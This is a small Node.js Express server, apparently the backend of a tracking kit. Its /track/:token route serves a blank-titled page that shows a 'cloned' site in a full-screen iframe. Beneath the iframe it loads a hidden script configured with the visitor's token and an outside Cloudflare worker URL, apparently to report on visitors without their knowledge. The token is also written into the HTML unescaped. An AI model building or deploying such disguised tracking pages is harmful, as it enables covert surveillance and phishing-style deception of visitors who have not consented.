const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

// ========== CONFIGURACIÓN ==========
const BASE_URL = process.env.BASE_URL || 'https://societyy-9z4e.onrender.com';
const WORKER_URL = process.env.WORKER_URL || 'https://wispy-bonus-51e9.societykark.workers.dev';

// ========== SERVIDOR ==========
// Servir archivos estáticos desde la RAÍZ
app.use(express.static(__dirname));

// Ruta raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Ruta de tracking
app.get('/track/:token', (req, res) => {
    const token = req.params.token;
    const urlClonada = 'https://example.com'; // O la URL que quieras

    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>.</title>
        <style>
            body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #ffffff; }
            #clone-iframe { border: none; width: 100%; height: 100%; }
        </style>
    </head>
    <body>
        <iframe id="clone-iframe" src="${urlClonada}"></iframe>
        <script 
            data-tracking-id="${token}" 
            data-server-url="${WORKER_URL}" 
            src="/script.js">
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`✅ Servidor en puerto ${PORT}`);
    console.log(`✅ BASE_URL: ${BASE_URL}`);
    console.log(`✅ WORKER_URL: ${WORKER_URL}`);
});
